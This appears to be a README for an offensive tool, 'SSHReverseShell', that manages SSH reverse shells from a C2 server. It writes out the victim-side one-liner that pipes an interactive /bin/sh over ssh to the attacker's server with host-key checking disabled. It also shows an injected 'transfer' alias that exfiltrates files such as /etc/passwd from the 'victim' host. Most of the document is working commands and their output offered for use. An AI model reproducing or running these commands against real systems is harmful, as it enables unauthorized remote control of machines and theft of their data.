# SSHReverseShell
Script to setup a SSH reverse shell manager on a C2 server

1. Setup on the server
    ```bash
    ./sshshell.sh -a /home/rshell/.ssh/id_rsa.pub
    ```
    ```
    Adding SSH public key rshell => ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOG+aXTDEM4k6Y/20s0NDZNWlmad+3nQotJYBBwqT7Ai/INV59WsSbQyL91W5y+30rMZQlXpk2UfVyxrFHCaEtUz3CXP/kkFsj862dgc3b8HeQM83GlHj6lZmpxihdVrNsQ7vn6uJTA9Wwo12fkGEXsN985ksofQR9s+rVIQJT3SAmJNhwbc8hDpunHl2sSRYil+kdVcCABNzKMUz5/3N6iB1DHzzYdgAIyZQ4+wmemUbBQ+clvqrVC2OdKl7h7WSEqgSp4IsHO0Bmo7ELqNYR1ORGk505dGGx62hbO5f7gciirRsH5EyptpBG3xYZxns4E5ont13l9GsL+Ok8ZH6N git@scanner
    Run the following command on the remote server to connect the reverse shell:
      mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i <SSH private key file> -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@server > /tmp/f; rm /tmp/f
    ```

2. Connect from the client
    ```bash
    mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i ~/.ssh/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@server > /tmp/f; rm /tmp/f
    ```
3. Connect from the server
    ```bash
    ./sshshell.sh
    ```
    ```
    Connecting to 8.8.8.8_18000...
    user@victim:~$
    ```

## Aliases
When connecting with a full TTY SSHReverseShell injects aliases to help performing common commands

### transfer
The transfer alias allows secure file transfer over SSH.

Examples:
```bash
user@victim:~$ transfer /etc/passwd
Warning: Permanently added 'xxx.xxx.xxx.xxx' (ECDSA) to the list of known hosts.
File transfer mode saving to yyy.yyy.yyy.yyy/_etc_passwd
Received 2429 bytes
```

```bash
user@victim:~$ find . | transfer
Warning: Permanently added 'xxx.xxx.xxx.xxx' (ECDSA) to the list of known hosts.
File transfer mode saving to yyy.yyy.yyy.yyy/output_1548231431
Received 736 bytes
```
